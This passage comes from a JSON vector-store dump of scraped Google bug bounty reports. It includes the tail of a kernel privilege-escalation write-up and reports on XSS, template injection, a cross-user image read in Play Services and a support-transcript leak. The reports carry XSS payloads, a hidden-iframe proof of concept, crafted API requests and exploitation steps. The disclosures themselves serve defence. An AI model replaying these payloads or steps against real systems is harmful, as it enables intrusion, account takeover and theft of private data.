arbitrarily complex state now, seeing how we have 0x2000 bytes of controlled data at\r\nknown location to work with now. i found an arbitrary 32-bit write gadget (__io_commit_cqring), as well\r\nas an arbitrary 32-bit read gadget (bsg_get_command_q). we can forge f_op to point to our own buffer in such\r\na way that f_op->f_advise will point to these gadgets.\r\nthe last part is easy. i found a global reference chain to my own struct task_struct\r\n(unix_gc_inflight.prev, unix_sock->sock.sk_peer_pid->tasks[0]) and changed its\r\ncred and nsproxy to give me root privs.", "mimetype": "text/plain", "start_char_idx": 9503, "end_char_idx": 13569, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0c1db893-9181-40aa-81ab-40f7cf6bd643": {"__data__": {"id_": "0c1db893-9181-40aa-81ab-40f7cf6bd643", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b9fa964e-8184-4a91-a33b-114343d438e0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fbfd3e9332cbf1b53eb1ccb8d2eb3826986558a17223d67eeeba645604537edc", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "8935791f-c72f-44d8-93cf-e573c7e740ab", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "953025dd3487d01d60d2645108996aa0d1f45d7f66737c6d017d08b2250b1b43", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "victory is coming close..\r\nthe address.\r\nPWN STAGE:\r\nwe can forge arbitrarily complex state now, seeing how we have 0x2000 bytes of controlled data at\r\nknown location to work with now. i found an arbitrary 32-bit write gadget (__io_commit_cqring), as well\r\nas an arbitrary 32-bit read gadget (bsg_get_command_q). we can forge f_op to point to our own buffer in such\r\na way that f_op->f_advise will point to these gadgets.\r\nthe last part is easy. i found a global reference chain to my own struct task_struct\r\n(unix_gc_inflight.prev, unix_sock->sock.sk_peer_pid->tasks[0]) and changed its\r\ncred and nsproxy to give me root privs.\r\nAttack scenario:\r\nn/a\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 12941, "end_char_idx": 13612, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4e78950d-2b59-47bf-bbbd-d627a775464e": {"__data__": {"id_": "4e78950d-2b59-47bf-bbbd-d627a775464e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_182221.txt", "file_name": "20250408_175701_182221.txt", "file_type": "text/plain", "file_size": 3910, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1d46afa4-ccc6-421c-9628-d33ca49309fb", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_182221.txt", "file_name": "20250408_175701_182221.txt", "file_type": "text/plain", "file_size": 3910, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "84eb0e60a518bd9ce8cba407ac52dc5ab841761c4b70131e64045c3f11e34ec9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nReal-time Support API provides user access to chat transcripts between support agents\r\nReported by:\r\nRyan Kovatch\r\nGoogle VRP\r\ntriaged\r\n01:02 | Nov 24, 2022\r\naccepted\r\n08:52 | Nov 24, 2022\r\nfixed\r\n16:27 | Feb 22, 2023\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nReal-time Support API provides user access to chat transcripts between support agents\r\nProduct:\r\nGoogle Help\r\nURL:\r\nhttps://support.google.com\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nUsers receiving support from Google may have their case open for multiple days, and during this time, agents may create chats with other agents to discuss customer issues internally. These chats, as far as I understand, are associated with the original case in the backend, and thereby associated with the reporting user.\r\nLoading a product page on Google Help (for example\r\nGoogle Play Help\r\n) while you have open support cases shows the current status of the cases at the top of the page. This is powered by a request to\r\nhttps://support.google.com/apis/caseslist\r\n, which returns case IDs, summaries, and last updated timestamps. The root of the issue is that this API call returns internal case IDs as well as customer-facing ones.\r\nThis means a user is able to request an emailed copy of chat logs from these internal cases (if the participants used real-time chat functionality), even though they did not participate in them.\r\nPrerequisite:\r\nan open case with Google Support that an agent has chatted internally about. My support case was under Google Play and my agent contacted Play Tier 2 support about my issue. I'm afraid I can't provide reproduction steps for actions performed on internal systems, but I trust the team will be able to figure this part out. For reference, my case ID was\r\n3-1388000033001\r\nand the internal one was\r\n6-4560000033493\r\n.\r\nSteps to reproduce:\r\nOpen a debugging proxy (Burp Suite, Charles, etc.) and begin recording traffic.\r\nSign into Google and load the product page your support case is under on Google Help.\r\nObserve the \"Recent cases\" section appear under the \"Describe your issue\" search bar. Click \"Show more.\" It should have more than one -- any case with a message bubble icon to the left of it is vulnerable to this exploit.\r\nYour proxy should show a request to\r\nhttps://realtimesupport.clients6.google.com/v2/customers/me\r\n. Copy the\r\nX-Origin\r\n,\r\nAuthorization\r\n, and\r\nCookie\r\nheaders from this request.\r\nCompose a POST request of type\r\napplication/json\r\nto\r\nhttps://realtimesupport.clients6.google.com/v2/conversations:updateChatTranscriptEmailState?key=AIzaSyB5V4SIBGmrqREm7kf2fBJgPcBMCdUrLzE\r\n(the API Key is also from the previous request).\r\nPaste in the headers from earlier. In the body of the request, include a JSON object in the form of\r\n{\"caseId\": \"X-XXXXXXXXXXXXX\", \"sendChatTranscriptEmail\": true}\r\nwhere\r\ncaseId\r\nis the ID of one of the listed chat cases under \"Recent cases.\"\r\nSend the request.\r\nExpected behavior:\r\nThe server rejects the request saying the user does not have access (really, the case should not show on Google Help to begin with).\r\nActual behavior:\r\nThe server returns\r\n{\"chatTranscriptEmailState\": \"CHAT_TRANSCRIPT_EMAIL_REQUESTED\"}\r\nand the requesting user is emailed a transcript of the internal chat. (Subject line: \"Requested conversation copy.\")\r\nAttack scenario\r\nReceiving internal communications on the status of a support issue may be advantageous to a user who has been waiting, but really this is an information leak that concerns the privacy of support agents and the confidentiality of the company. This bug reveals the full name of the support agent who initiated the chat, and may also reveal confidential information about company policies and internal processes -- the transcript I received had an explicit warning against sharing any content meant for \"internal use only.\"\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3894, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "42ea0ff1-9692-4f4a-a991-dcdd94b88766": {"__data__": {"id_": "42ea0ff1-9692-4f4a-a991-dcdd94b88766", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_229442.txt", "file_name": "20250408_175701_229442.txt", "file_type": "text/plain", "file_size": 1470, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e862f6c7-60ae-41c4-9d8f-4b63f4ae461d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_229442.txt", "file_name": "20250408_175701_229442.txt", "file_type": "text/plain", "file_size": 1470, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "193d27637ff413229898f8e15f8807e5efb4b6406812b47fd613cfe494e12c86", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nssti in console.firebase.google.com\r\nReported by:\r\nAditya singh\r\nGoogle VRP\r\ntriaged\r\n01:25 | Nov 24, 2022\r\naccepted\r\n02:26 | Nov 24, 2022\r\nfixed\r\n13:53 | Dec 17, 2022\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nssti in console.firebase.google.com\r\nProduct:\r\nhttps://console.firebase.google.com/\r\nURL:\r\nhttps://console.firebase.google.com/\r\nVulnerability type:\r\nOther\r\nDetails\r\nServer-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side. This vulnerability occurs when invalid user input is embedded into the template engine which can generally lead to remote code execution (RCE).\r\nstep to reproduce:\r\ngo to the\r\nhttps://myaccount.google.com/personal-info?hl=en_GB\r\nand edit the name parameter  and give ssti paylaod like this {{7*7}}\r\nno navigate the\r\nhttps://console.firebase.google.com/\r\nlogout if you are already logged in\r\nlogin again now\r\nthen go to\r\nhttps://console.firebase.google.com/?utm_source=firebase.google.com&utm_medium=referral\r\nNow move your mouse cursor over the photo on the right side.\r\nYou will see that the numbers are adding\r\nAttack scenario\r\nI am not an advanced hacker , but  Ransomware gang exploiting it with their own method and taking advantage of it, they can disturb Google a bit by exploiting it.\r\nWell I am not a good hunter but in some cases it  goes to RCE level\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1454, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0f5f2137-5ea2-42b4-babc-40e2281b9c62": {"__data__": {"id_": "0f5f2137-5ea2-42b4-babc-40e2281b9c62", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_291889.txt", "file_name": "20250408_175701_291889.txt", "file_type": "text/plain", "file_size": 2266, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "732f8371-e2f8-43f4-82e0-c5be41df060d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_291889.txt", "file_name": "20250408_175701_291889.txt", "file_type": "text/plain", "file_size": 2266, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "69f57d526c8341efc12578652bc46c45873e1d7dacc6aeaa6c61559648deed70", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nEXIF Geolocation Data Not Stripped From googleapis storage  Uploaded Images\r\nReported by:\r\nAditya singh\r\nGoogle VRP\r\ntriaged\r\n02:53 | Nov 22, 2022\r\nclosed\r\n08:57 | Nov 24, 2022\r\naccepted\r\n18:27 | Nov 29, 2022\r\nfixed\r\n15:54 | Sep 27, 2023\r\nSummary:\r\nEXIF Geolocation Data Not Stripped From googleapis storage  Uploaded Images\r\nProduct:\r\nhttps://console.cloud.google.com/\r\nURL:\r\nhttps://console.cloud.google.com/apis\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nDescription:-\r\nWhen the user uploads his profile picture, the uploaded image's EXIF Geolocation Data does not get stripped. As a result, anyone can get sensitive information of microweber users like their Geolocation, their Device information like Device Name, Version, Software & Software version used, etc.\r\nWhenever a customer use  Google Cloud does it for storage it also uses the googleapi , But this is a vulnerability if someone Google Cloud does it for storage ,If it is uploaded by users like profile photo etc then it does not extract the meta data of the image.\r\nI have seen more than hundreds of website which google cloud use for profile pictures.\r\nBut when a user updates a photo, it does not remove the meta data . even\r\nhttps://bughunters.google.com/\r\nthis website also use the google storage .\r\nIn the consequences of which the extract location of the user's house means from where exactly that photo was taken, it is visible in its meta data.  and device name version date time etc is visible in all meta data\r\nstep to reproduce:\r\ngo to the\r\nhttps://bughunters.google.com/profile/\r\nand upload a profile pic with the location in the exif.\r\nafter successfully upload a profile pic right click profile and copy the link\r\ngo to the online exif extractor website jimple.com and paste the image link\r\nboom you're able to see user exact location etc\r\nAttack scenario\r\nThis vulnerability is CRITICAL  according to the\r\nbugcrowd\r\n,\r\nhackerone\r\nThis is a P3 level bug. when  a  website/company that will be using Google Cloud, if they want to fix this, then they have no option. as a result of which they will move like another cloud , It is a matter of user's trust and confidentials of their data.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2250, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d23e4ff0-621c-41bc-ac65-1f9c25100a62": {"__data__": {"id_": "d23e4ff0-621c-41bc-ac65-1f9c25100a62", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_419142.txt", "file_name": "20250408_175703_419142.txt", "file_type": "text/plain", "file_size": 1659, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "00452626-e686-4fd0-aaef-6c94b4a53ecf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_419142.txt", "file_name": "20250408_175703_419142.txt", "file_type": "text/plain", "file_size": 1659, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "313bf282a194991b9324cb536c99b823ac36e7ddc0385908924d6dd337cc5075", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS on https://websdk.ujet.co\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\nclosed\r\n23:30 | Nov 14, 2022\r\naccepted\r\n17:56 | Nov 15, 2022\r\nfixed\r\n15:10 | Mar 10, 2023\r\nSummary:\r\nXSS on\r\nhttps://websdk.ujet.co\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://cloud.google.com/contact-center/ccai-platform/docs/Guide/publication--en?hl=en\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nUsing the chat message feature of Cloud Contact Center an agent can XSS the user on\r\nhttps://websdk.ujet.co\r\nby messaging https://\"onmousemove=\"alert(window.origin)\" this will alert on mouse movement over the link.\r\nThis can also be done by setting a custom \"Waiting for Agent Assignment Message\" like\r\n <img src=x onerror=alert(window.origin)>\r\nOriginally reported in issue 258549653\r\nhttps://cloud.google.com/contact-center/ccai-platform/docs/Customizing_Languages__Recordings____Messages?hl=en\r\nAttack scenario\r\nhttps://websdk.ujet.co\r\nis a shared origin used to render all chat sessions from Cloud Contact Center.\r\nAny website with there own chat can hijack a different websites chat session via the window opener.\r\nIt may also be possible to force a websites chat open and view the history by abusing proactive.html which also seems to allow for sending requests as the SDK and getting the response via postMessage but I cant test it currently since the test instance is no longer running.\r\nHaving an XSS on\r\nhttps://websdk.ujet.co\r\nalso increases the attack surface of the victims website for example its a origin thats trusted by cobrowse which is a feature of the SDK\r\nhttps://cobrowse.io/\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1643, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "dd1fd101-f34e-4652-9422-bc8af4d92161": {"__data__": {"id_": "dd1fd101-f34e-4652-9422-bc8af4d92161", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_466234.txt", "file_name": "20250408_175703_466234.txt", "file_type": "text/plain", "file_size": 1022, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "356064ba-2a01-45e1-abac-af478c5f5f54", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_466234.txt", "file_name": "20250408_175703_466234.txt", "file_type": "text/plain", "file_size": 1022, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8d9bda161eccb79b8ff0fc0697388f7aaee3148fe723a81b7c6e5d5840da3194", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS on https://security-test-ari76op.uc1.ccaiplatform.com\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n17:52 | Nov 10, 2022\r\naccepted\r\n23:59 | Nov 10, 2022\r\nfixed\r\n10:00 | Jan 19, 2023\r\nSummary:\r\nXSS on\r\nhttps://security-test-ari76op.uc1.ccaiplatform.com\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://security-test-ari76op.uc1.ccaiplatform.com/agent/?type=popup&popup=cobrowse&cobrowseDomain=javascript:alert(window.origin);%2F%2F\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nlet f = document.createElement('iframe');\r\nf.hidden = true;\r\nf.src = 'https://security-test-ari76op.uc1.ccaiplatform.com/agent/?type=popup&popup=cobrowse&cobrowseDomain=javascript:alert(window.origin);%2F%2F';\r\ndocument.body.appendChild(f);\r\nWait a \"small\" amount of time for alert to happen.\r\nAttack scenario\r\nAny website can get XSS on Contact Center AI.\r\n(I dont know much about it not created an account yet)\r\nFound as part of grant issue 258419050\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1006, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4761fa97-9da4-4739-950a-1344742d487d": {"__data__": {"id_": "4761fa97-9da4-4739-950a-1344742d487d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.txt", "file_name": "20250408_175703_529990.txt", "file_type": "text/plain", "file_size": 4791, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b1e5d45f-7774-43a7-9b9b-e5a1dbe4e42e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.txt", "file_name": "20250408_175703_529990.txt", "file_type": "text/plain", "file_size": 4791, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0cdb538ce2ae8a4e3793b9d9663e3725c0d6e4ddd8f5a4a7fce680863516683a", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "d00909c2-1cc8-454c-87a5-8efa41bc4b2e", "node_type": "1", "metadata": {}, "hash": "8565cfaa279c28f0ca71b0aa8121f943c848c1f3aad1e986c054bb138451aa78", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nUser isolation bypass due to confused deputy in Google Play Services\r\nReported by:\r\nsithi\r\nGoogle VRP\r\ntriaged\r\n21:35 | Nov 7, 2022\r\naccepted\r\n23:58 | Nov 8, 2022\r\nfixed\r\n12:04 | Jun 12, 2023\r\nreward decided\r\n$1,337\r\nSummary:\r\nUser isolation bypass due to confused deputy in Google Play Services\r\nProduct:\r\nGoogle Play\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nThis issue exists in the Google Play Services Android app. (\r\ncom.google.android.gms\r\n) hereafter referred to as GMS. The issue manifests when trying to select a Google account profile photo through Google account settings. It likely exists in\r\ncom.google.android.gms.people.profile.AvatarActivity\r\n, though I can't be sure about this due to the obfuscation used in the app.\r\nAn abridged description of what happens whenever a user tries to pick a photo for their Google account:\r\nGMS gives them an option to either take a photo or choose a photo.\r\nIf the user elects to choose an image, it starts an intent with\r\nACTION_PICK\r\n.\r\nAn app chooser is shown to the user containing every app that can handle this action.\r\nThe app chosen by the user returns (with\r\nsetResult\r\n) an Intent containing a URI in its data field.\r\nGMS reads an image from this URI, and shows the user a crop menu containing the image.\r\nFinally, GMS sets the cropped image as the profile photo.\r\nThis gives rise to a classic confused deputy issue, because in step 5, the image is being read with GMS's own permissions. GMS is one of the most privileged apps that come with an Android device, and as such, it also has the\r\nINTERACT_ACROSS_USERS\r\npermission.\r\nTo exploit this, we can use an undocumented behavior in Android which allows us to create URIs that point to resources belonging to other users - prepending the target user ID to the URI authority followed by an @ symbol. As an example:\r\nNormal media URI:\r\ncontent://media/external/images/media/[x]\r\n2nd user's media URI:\r\ncontent://10@media/external/images/media/[x]\r\nTherefore, if a user creates an app that receives GMS's\r\nACTION_PICK\r\nIntent and returns a URI pointing to an arbitrary image that belongs to another user, GMS will use its own superior privileges to read this image and display it on a cropping menu.\r\nAttack scenario\r\nA malicious user can use this issue to read private image files belonging to other users of the device. This includes any image file in the victim user's storage space, the victim user's contact photos, and more. (generally any type of image file that GMS itself can access - which likely encompasses almost every image file in the device) Admin privileges are not required, and normal users can read images belonging to admin users as well.\r\nThis can likely be used to also read images from other profiles in enterprise devices, though at this moment I have no way of testing this.\r\nThis is a security issue since Android's security principles mandate a complete isolation between users and profiles, other than a few specific exceptions of non-personal data. (e.g., app updates and system configurations) For instance, such issues in AOSP apps are\r\nconsidered high-severity\r\n.\r\nThe attached app reads media files from an arbitrary user. I reproduced the issue in the latest public GMS version (22.43.12) in a Pixel 6 device. To reproduce the issue:\r\nSwitch to the target user and take some photos. (you can also just copy some images in)\r\nSwitch to the attacker user and install the attached app. Don't launch it yet.\r\nNavigate to Settings -> Google -> Manage your Google Account -> [Profile Photo Circle] -> Set Profile Photo -> Choose photo -> GMS Profile Photo Exploit.\r\nEnter the target user ID and the target media ID.\r\nThe primary user has an ID of 0. Secondary user IDs in Android are assigned sequentially starting from 10. IDs 1-9 are unused.\r\nMedia IDs are assigned sequentially starting from somewhere around 1000000010. If the target is the main user, you can speed up the process for testing by running\r\nadb shell content://media/external/images/media\r\nand then looking for the\r\n_id\r\nfield. (though an actual attacker can't do this)\r\nYou (and an actual attacker) can also brute-force the media ID by just trying numbers starting from 1000000010 in ascending order. You'll likely hit a valid value after less than 20 tries.\r\nPress \"Done\".", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4345, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d00909c2-1cc8-454c-87a5-8efa41bc4b2e": {"__data__": {"id_": "d00909c2-1cc8-454c-87a5-8efa41bc4b2e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.txt", "file_name": "20250408_175703_529990.txt", "file_type": "text/plain", "file_size": 4791, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b1e5d45f-7774-43a7-9b9b-e5a1dbe4e42e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.txt", "file_name": "20250408_175703_529990.txt", "file_type": "text/plain", "file_size": 4791, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0cdb538ce2ae8a4e3793b9d9663e3725c0d6e4ddd8f5a4a7fce680863516683a", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "4761fa97-9da4-4739-950a-1344742d487d", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.txt", "file_name": "20250408_175703_529990.txt", "file_type": "text/plain", "file_size": 4791, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0597977723e1cb07d3368b64b90fe2422b29c63a16f89d53f62da8e8f083df40", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Don't launch it yet.\r\nNavigate to Settings -> Google -> Manage your Google Account -> [Profile Photo Circle] -> Set Profile Photo -> Choose photo -> GMS Profile Photo Exploit.\r\nEnter the target user ID and the target media ID.\r\nThe primary user has an ID of 0. Secondary user IDs in Android are assigned sequentially starting from 10. IDs 1-9 are unused.\r\nMedia IDs are assigned sequentially starting from somewhere around 1000000010. If the target is the main user, you can speed up the process for testing by running\r\nadb shell content://media/external/images/media\r\nand then looking for the\r\n_id\r\nfield. (though an actual attacker can't do this)\r\nYou (and an actual attacker) can also brute-force the media ID by just trying numbers starting from 1000000010 in ascending order. You'll likely hit a valid value after less than 20 tries.\r\nPress \"Done\". You should see a photo from step 1 in a cropping menu - if not, please retry step 4 with a different media ID.\r\nTo fix this issue, I recommed restricting this particular Intent to the system image picker. This can be done by using\r\nqueryIntentActivities\r\nwith\r\nMATCH_SYSTEM_ONLY\r\nto determine the system picker in a device-agnostic manner, and then using\r\nsetPackage\r\nto restrict the Intent prior to starting.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3492, "end_char_idx": 4775, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c6b5f50a-4abb-45c8-b3f1-87923571cc49": {"__data__": {"id_": "c6b5f50a-4abb-45c8-b3f1-87923571cc49", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_561128.txt", "file_name": "20250408_175703_561128.txt", "file_type": "text/plain", "file_size": 3335, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2e6ad1d1-039b-4708-8ac5-dd5ec5203b1b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_561128.txt", "file_name": "20250408_175703_561128.txt", "file_type": "text/plain", "file_size": 3335, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cd6758d5369be12a6b14824c8c62a26c8d68fd2a3f76749799007e16f82561af", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSingle click account takeover in Kaggle\r\nReported by:\r\nJainam Shah\r\nGoogle VRP\r\ntriaged\r\n22:48 | Oct 20, 2022\r\naccepted\r\n00:54 | Oct 21, 2022\r\nfixed\r\n09:13 | Nov 6, 2022\r\nreward decided\r\n$100\r\nSummary:\r\nSingle click account takeover in Kaggle\r\nProduct:\r\nKaggle\r\nURL:\r\nhttps://www.kaggle.com/datasets/\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nThis report actually is 2 reports looped into one which I thought would be best since there exists a mechanism to fix both problems together. But  please note the root cause for both is different.\r\nSingle click account takeover in Kaggle.com via xss\r\nReproduction steps:-\r\n1) Go to Kaggle.com on the left sidebar go to datasets and create a new dataset.(Title it anything and just upload any file to create)\r\n2) Go to the webpage of the dataset and edit  'about dataset'.\r\n3)This part allows markdown and allows us to add 